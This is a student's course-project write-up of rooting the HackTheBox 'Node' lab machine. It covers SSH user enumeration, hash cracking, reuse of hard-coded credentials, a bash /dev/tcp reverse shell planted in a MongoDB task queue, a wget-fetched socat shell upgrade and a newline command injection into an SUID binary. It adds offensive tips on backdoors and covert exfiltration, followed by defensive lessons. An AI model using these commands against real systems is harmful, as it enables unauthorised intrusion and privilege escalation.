# Cracking an HTB Machine

> Offensive Technologies Course Project - Ahmed Nouralla



[TOC]

## Introduction

- [HackTheBox](https://hackthebox.com) is a CyberSecurity training platform providing boxes (virtual machine) to practice penetration testing skills.
- For this project, I chose to crack the machine titled "Node". It's a medium-difficulty Linux box (rated 4.8). According to the box's description, it provides:
  - Focus on new software, poor configurations, and in-depth enumeration.
  - Simple start that gets progressively more difficult as more access is gained.
- The box covered many interesting areas:
  - Exploitation of a modern Node.js web application with MongoDB database.
  - Encoding and compression, password cracking, and reverse hash lookups.
  - Source code analysis and binary exploitation for privilege escalation.
- Tools and techniques used throughout the work:
  - Port and service scanning with Nmap
  - SSH user enumeration using Metasploit module
  - Web technologies fingerprinting with Wappalyzer
  - Web application fuzzing with FFUF
  - Wordlist-based password attacks with John The Ripper and SecLists
  - Rainbow tables (hash reverse lookups) with [Hashes.com](https://hashes.com)
  - Exploiting hard-coded secrets and credentials reuse
  - Reverse shell to switch between different users
  - Shell upgrade with statically-linked `socat` binary.
  - Binary security check with CheckSec
  - Binary disassembling and decompilation with Ghidra.
  - OS command injection against an SUID binary to escalate privileges.


## Steps Taken

### 1. Reconnaissance

- Started with an initial `nmap` port scan. Pings were getting blocked, so I used `-Pn` flag.

  ![image-20250424043431940](https://i.imgur.com/SJBUG5r.png)

- Continued with advanced/aggressive scan against the open ports with service detection.

  ![image-20250424043443106](https://i.imgur.com/Nfl31zH.png)

- Findings:
  - OpenSSH 7.2p2 server running on port 22.
  - Node.js Express HTTP server running on port 3000.

### 2. SSH Port

- Port 22 runs an older version of OpenSSH that is notably associated with [CVE-2016-6210](https://www.cvedetails.com/cve/CVE-2016-6210/).

  > `sshd` in OpenSSH before 7.3, when SHA256 or SHA512 are used for user password hashing, uses BLOWFISH hashing on a static password when the username does not exist, which allows remote attackers to **enumerate users** by leveraging the timing difference between responses when a large password is provided.

- Started an enumeration using metasploit's module `auxillary/scanner/ssh/ssh_enumusers` and wordlist `SecLists/Usernames/names.txt`. It was quite time consuming so I left it running in the background while looking through other artifacts. Initial results seemed promising.

  ```bash
  $ msfconsole
  > use scanner/ssh/ssh_enumusers
  > set RHOSTS 192.168.122.165
  > set USER_FILE /snap/seclists/737/Usernames/names.txt
  > run 
  ```
  
  ![image-20250424062613708](https://i.imgur.com/cBCU0xd.png)

### 3. HTTP Port

- Port 3000 hosts a normal-looking app with a login button on top, clicking it redirects to a simple login form (no option to register).

  ![image-20250424043542863](https://i.imgur.com/S3PBPLR.png)

  ![image-20250426063740609](https://i.imgur.com/6HQY0qa.png)

- Chrome devtools (`F12`) show frontend source code. Wappalyzer extension helps identifying technologies and versions.

  ![image-20250424044530487](https://i.imgur.com/BhNGRxc.png)

- Fuzzing for hidden endpoints with `ffuf`: The endpoints discovered redirect back to `/`.

  ![image-20250424045621922](https://i.imgur.com/Mg7Men9.png)

- Noticed an endpoint for `/api/users` in `profile.js`. It expects a user name

  ![image-20250424074728420](https://i.imgur.com/PypiO0E.png)

- If we didn't supply a user, a some records from the database are returned.

  ![image-20250424050528071](https://i.imgur.com/JdyfomI.png)

- Passwords seem to be stored as unsalted SHA256 hashes. Three out of four were cracked on [hashes.com](https://hashes.com) (rainbow table service for reverse-hash lookups)

  ![image-20250424050425562](https://i.imgur.com/oxdLPnz.png)

- Tested if discovered usernames are usable for SSH.

  ![image-20250424061848211](https://i.imgur.com/r5Jt5Lt.png)

- Seems like `tom` and `mark` are valid user accounts on the machine targets. The passwords from cracked hashes didn't work for SSH however.

- Back to the login form, we managed to log-in successfully as an `admin` user with credentials `myP14ceAdm1nAcc0uNT:manchester`. It only shows a link to download some backup file.

  ![image-20250424050831575](https://i.imgur.com/wGuS12k.png)

### 4. Source Code Analysis

- Backup file contained base64 string, decoding it yielded a password-protected ZIP archive.

  ![image-20250424051407019](https://i.imgur.com/lBZxyTC.png)

- Brute-forcing archive password with `john-the-ripper` and `rockyou.txt`.

  ![image-20250424054437276](https://i.imgur.com/NHHbMn9.png)

- Extracting the archive given the password `magicword`, we obtain the server-side source code of the app.

- Two secrets are hardcoded on top: MongoDB connection string and some `backup_key`

  ![image-20250424055229917](https://i.imgur.com/dqEnAw2.png)

- The `backup_key` is supplied as an argument to some local binary at `/usr/local/bin/backup`, let's keep this info in mind for now.

  ![image-20250426012716457](https://i.imgur.com/h3BmdtD.png)

- MongoDB port is not exposed so we cannot login to the database directly. However, it seems the database user is `mark` that we know is a valid user on the VM.

### 5. Initial Foothold

- The database password obtained above worked for `ssh mark@192.168.122.165`

  ![image-20250424065624797](https://i.imgur.com/2gj1ehj.png)

- Checking the content of the home directory, we see `user.txt` flag is present in `tom`'s directory, but only readable by members of `tom` group (current user `mark` is not a member of that group).

  ![image-20250424070806400](https://i.imgur.com/VHoGthV.png)

### 6. Switching User

- Listing the processes running under `tom`'s account, we see the `app.js` obtained earlier and another `scheduler/app.js` script.

  ```bash
  $ ps aux | grep tom
  $ cat /var/scheduler/app.js
  ```

  ![image-20250426054001310](https://i.imgur.com/uAk734j.png)

  ```js
  const exec        = require('child_process').exec;
  const MongoClient = require('mongodb').MongoClient;
  const ObjectID    = require('mongodb').ObjectID;
  const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';
  
  MongoClient.connect(url, function(error, db) {
    if (error || !db) {
      console.log('[!] Failed to connect to mongodb');
      return;
    }
  
    setInterval(function () {
      db.collection('tasks').find().toArray(function (error, docs) {
        if (!error && docs) {
          docs.forEach(function (doc) {
            if (doc) {
              console.log('Executing task ' + doc._id + '...');
              exec(doc.cmd);
              db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
            }
          });
        }
        else if (error) {
          console.log('Something went wrong: ' + error);
        }
      });
    }, 30000);
  
  });
  ```

- Script behavior:

  1. Connect to a `scheduler` database in mongo (connect as `mark`)
  1. Fail in case of connection errors
  1. Run the following logic on a schedule (every 30 seconds):
     1. Read string commands from `tasks` collection
     1. Execute the commands (under the process owner; i.e., `tom`)
     1. Delete the string from the collection.

- This gives an opportunity to run arbitrary commands as `tom`! How about a [reverse shell](https://www.revshells.com/)?

  ```bash
  $ mongo -u mark -p 5AYRft73VtFpc84k scheduler
  > db.tasks.insert({"cmd": "bash -c 'bash -i >& /dev/tcp/192.168.122.1:4444 0>&1'"})
  ```

  ![image-20250424075725608](https://i.imgur.com/awpSv9z.png)

- After a while, our `nc -lvnp 4444` listener was contacted and we obtained a shell as `tom`, allowing us to read the `user` flag!

  ![image-20250424080109512](https://i.imgur.com/alYSR9t.png)

- Upgrading the shell for convenience [[ref](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)]

  ```bash
  # Listener (ahmed)
  socat file:`tty`,raw,echo=0 tcp-listen:4444
  
  # Victim (tom)
  ## 1. Download socat static binary to /tmp and give execute permissions
  wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat
  ## 2. Connect to our listener
  /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.122.1:4444
  ```

  ![image-20250425234937316](https://i.imgur.com/FcVe3kn.png)

### 7. Privilege Escalation

#### 7.1. Exploring Attack Vectors

- First things first, let's search for SUID-enabled binaries in the system

  ```bash
  $ find / -perm -u=s -type f 2>/dev/null
  /usr/lib/eject/dmcrypt-get-device
  /usr/lib/snapd/snap-confine
  /usr/lib/dbus-1.0/dbus-daemon-launch-helper
  /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
  /usr/lib/openssh/ssh-keysign
  /usr/lib/policykit-1/polkit-agent-helper-1
  /usr/local/bin/backup
  /usr/bin/chfn
  /usr/bin/at
  /usr/bin/gpasswd
  /usr/bin/newgidmap
  /usr/bin/chsh
  /usr/bin/sudo
  /usr/bin/pkexec
  /usr/bin/newgrp
  /usr/bin/passwd
  /usr/bin/newuidmap
  /bin/ping
  /bin/umount
  /bin/fusermount
  /bin/ping6
  /bin/ntfs-3g
  /bin/su
  /bin/mount
  ```

- The binary in `/usr/local/bin` seems to be an interesting target since the directory usually contains user-created executables. Let's check the file permissions and info.

  ![image-20250426001016041](https://i.imgur.com/zjXYgwf.png)

- Lucky for us:

  - `tom` is a member of the `admin` group that may read and execute the binary.
  - The binary is a 32-bit ELF that is not stripped (debug info included).

- Let's grab that file for more extensive experimentation

  ![image-20250425235125840](https://i.imgur.com/6m7WvU7.png)

- Binary security check with `checksec` shows promising results:

  - Binary isn't a PIE (Position-Independent Executable)
  - Stack canary is not enabled: stack smashing will not crash the program
  - Let's keep this info in mind and start examining the source first

  ![image-20250425235322231](https://i.imgur.com/795cSZ8.png)

- Decompiling the binary with `ghidra` (showing interesting part from main method)

  ![image-20250426010432054](https://i.imgur.com/dq2Opp6.png)

- There are two exploitation paths to consider here:

  - **Command injection**
    - Line 252 involves a `system` call with user-controlled input. Note that `pcVar4` (path to directory to be archived) traces back to `local_6f5` traces back to `argv[3]`
  - **Buffer overflow**
    - Line 242 (first line in the screenshot above) contains a `strcpy` call, copying the content of `argv[3]` onto the stack without bound checking. But since `NX` is enabled, exploitation can be quite complex, we potentially need a `return-to-libc` attack.

#### 7.2. Command Injection Exploit

- The core logic of the binary

  1. Runs `/usr/bin/zip` to archive a directory with password `magicword`.
  1. Store the archive in a file named `/tmp/.backup_%i` where `%i` is a random integer resulting from a mix of `getpid()`, `time(0)`, and `clock()`.
  1. The resulting binary is printed to `stdout` after being `base64`-encoded.
  1. The file in `/tmp` file is explicitly deleted before exiting.

- The binary runs as root and our payload should end up executing in the following command.

  ```bash
  /usr/bin/zip -r -P magicword /tmp/.backup_%i <PAYLOAD> > /dev/null
  ```

- Recall from `app.js` that the binary was called with

  - `argv[1] = '-q'`
  - `argv[2] = 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474` (hardcoded `backup_key`)
  - `argv[3]` is where we can inject our payload

  ![image-20250426013054217](https://i.imgur.com/7b6w227.png)

- More complications: the decompiled binary starts with multiple checks similar to this one.

  ![image-20250426013511367](https://i.imgur.com/2u2Slwp.png)

- These checks use C functions `strstr` and `chrstr`; i.e., looking for needles (given strings/chars) in haystacks (`argv[3]` string), respectively.

  - It basically maintains a blacklist of invalid values that cannot be in `argv[3]`

    - Blacklisted values: `..`, `/root`, `;`, `&`, literal tick symbol, `$`, |, `//`, `/etc` 
  - If any blacklisted character is found, it prints the shown hard-coded base64 key.

  - When piped to `base64 -d > out.zip` we get an archive containing `root.txt`.

  - When extracted with `magicword`, it shows an ASCII troll face.

    ![image-20250426013849559](https://i.imgur.com/BUKBX4e.png)

- `strstr` and `strchr` calls used above do not check for endlines! This binary invocation worked:

  ```bash
  ./backup -q "45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474" ' nonexistent
  /bin/bash '#
  ```

- The executed code would look like this, terminating the `zip` command and spawning a shell.

  ```bash
  /usr/bin/zip -r -P magicword /tmp/.backup_123 nonexistent
  /bin/bash # > /dev/null
  ```

- Verification and root flag

  ![image-20250426031653260](https://i.imgur.com/IIuWP9w.png)

## Discussion

### Lessons learned (Offensive Side)

- Port scanning
  - Nmap may not report all results, make sure to verify with `-p-` to be sure.
  - Host may be configured to block pings, scan anyway with `-Pn` flag when in doubt.
  - Scanner may not show accurate results due to non-standard ports used or other errors, better to verify manually or use specialized clients if needed.
- Outdated software
  - Stay on the lookout for outdated software and dependencies
  - Check findings against relevant known CVEs, public exploits, and metasplot modules.
- Automate some steps
  - If allowed, utilize automatic scanners/fuzzers/paylaod generators to speed up the process.
  - To save tiem, leave long-running processes and move on to explore different attack vectors
  - Fuzzing in particular can help uncover hidden endpoints and trigger unintended application behaviors
- Utilize appropriate wordlists depending on the nature of the target
  - Verify lists are updated and relevant.
  - Given some context, it may make sense to modify the wordlist by adding/removing entries.
  - To save time, start with smaller lists, then move to larger ones if needed
- Utilize existing reverse-hash lookup tables before trying to break them on your own
- Look for leaked secrets in source code, environment variables, bash/git history, etc.
- Refer to popular sources of carefully crafted payloads to save time
- Upon getting initial access
  - Focus on maintaining that access: install backdoor, upgrade shell
- Minimize fingerprint on the compromised host
  - Download statically linked binaries to `/tmp`; Execute, then delete them.
  - Utilize a covert channel to exfiltrate data or artifacts to be locally analyzed.
- Binary exploitation
  - Utilize linux-native tools like `file` and `readelf` to get initial info about the file (e.g., architecture, whether debugging info is included, libraries used, etc.)
  - Skim the binary source for unintended behavior (e.g., file operations or network activity) before running it.  
  - When unsure, better to scan a binary for malicious behavior before attempting dynamic analysis.
  - If decompilation is feasible, it might be worth analyzing it. AI tools can already help with that!
  - Check security features of the binary (e.g., using checksec) before attempting exploitation.
  - Look for multiple attack vectors, maybe an easier path is possible.
  - Look for weaknesses or misuse of C functions in decompiled source.

### Lessons learned (Defensive Side)

- Network security
  - Disable/uninstall unneeded services
  - Configure firewall filters with a deny-by-default policy
  - Add additional layers of defense: IDS/IPS, WAF, Honeypots
  - Disable password-based SSH, use PKI instead.
  - Regularly monitor traffic for suspecious activities
- Secret management
  - No hard-coded credentials, no use of plain secrets in commands.
  - Setup secure passwords, rotate them and never reuse across systems.
  - Regularly rotate keys/tokens, avoid master keys.
  - Implement granular access control and least privilege.
- Coding
  - Avoid unsafe C functions and sanitize all user input
  - Use established cryptographical methods for password hashing, salting, and storage.
- Hardnenings
  - Configure the system with hardened defaults (e.g., following CIS benchmarks)
  - Configure and enable features for binary security: ASLR, NX/DEP, PIE, Stack Canaries, etc.
- Monitoring and Incident Response
  - Configure monitoring for all systems/services.
  - Regularly check access logs and setup automated alerts.
  - Prepare strategies for quick reaction to cyber attacks.

## References

- https://www.hackthebox.com/machines/Node
- https://www.vulnhub.com/entry/node-1,252/
- https://www.cvedetails.com/cve/CVE-2016-6210/
- https://www.revshells.com/
- https://www.hashes.com/
- https://bash-upload.com/
- https://github.com/andrew-d/static-binaries
- https://github.com/swisskyrepo/PayloadsAllTheThings
- https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

